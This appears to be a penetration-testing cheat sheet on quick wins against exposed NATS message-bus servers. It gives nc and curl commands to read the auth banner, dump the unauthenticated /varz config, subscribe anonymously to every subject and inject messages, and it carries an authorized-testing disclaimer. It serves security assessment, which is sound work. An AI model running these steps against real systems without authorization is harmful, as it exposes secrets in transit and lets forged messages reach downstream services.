---
service: nats
title: NATS
ports: 4222, 8222, 6222
aliases: nats-client, nats-monitoring
---

# NATS — quick wins

**When you see it:** 4222/tcp open and the connect banner shows `"auth_required":false` →
anonymous publish/subscribe on the message bus. The 8222 monitoring port additionally serves
`/varz` (full config, unauthenticated). NATS carries inter-service messages, so anonymous
subscribe = read every message flowing through.

> Authorized testing only. Triage is read-only. Subscribing reads live messages; steps marked
> ✏️ publish to subjects — get sign-off before injecting.

## Triage (read-only)
```sh
nc -w3 H 4222 </dev/null                     # INFO banner: version + auth_required
curl -s http://H:8222/varz | python3 -m json.tool | grep -Ei "version|auth|max_payload"
curl -s http://H:8222/connz                  # active connections
curl -s http://H:8222/subsz                  # subscription stats
```

## Quick wins

### Read the INFO banner (auth state)
```sh
printf '' | nc -w3 H 4222
```
*Why:* the server sends an `INFO {...}` JSON line on connect before any auth — it discloses
version, `auth_required`, `tls_required`, and `max_payload`. `auth_required:false` means the
next two techniques work anonymously.

### Anonymous subscribe — sniff all subjects ✏️
```sh
nats sub -s nats://H:4222 ">"              # ">" = full wildcard (needs the nats CLI)
# raw protocol fallback:
{ printf 'CONNECT {}\r\nSUB > 1\r\n'; sleep 5; } | nc H 4222
```
*Why:* `>` subscribes to every subject; on an unauth bus this streams every message —
service-to-service RPC, events, and any secrets carried in payloads. (Marked ✏️ as it opens a
subscription, though it does not modify data.)

### Config leak via /varz
```sh
curl -s http://H:8222/varz | python3 -m json.tool
```
*Why:* the monitoring `/varz` endpoint dumps the running config — listen addresses, cluster
routes (6222), auth settings, and often account/user structure — all unauthenticated.

### Publish / inject ✏️
```sh
nats pub -s nats://H:4222 SUBJECT 'aranum-test'
```
*Why:* if publish is allowed, you can inject messages that downstream consumers act on — a
logic/integrity abuse primitive. Sign-off required.

## aranum helpers
- `aranumtoolkit/network/enum-nats.sh` — dispatcher (4222 client INFO banner + 8222 `/varz` config exposure + `auth_required` check).

## Gotchas
- `auth_required:true` in the banner means the client port needs a token/user — but `/varz` on 8222 is often *still* open and leaks the config.
- 6222 is the cluster route port — a leaked cluster auth token there lets you join as a routing node and see all traffic.
- The `nats` CLI is the cleanest client; the raw `CONNECT/SUB` protocol works over `nc` when it isn't installed.
- TLS-required servers (`tls_required:true`) need `--tlsca`/`-k`-style flags — the plaintext `nc` probe will be dropped after INFO.

## Sources
- NATS client protocol / monitoring (`/varz`, `/connz`) docs; HackTricks NATS notes; aranum `enum-nats.sh` header.
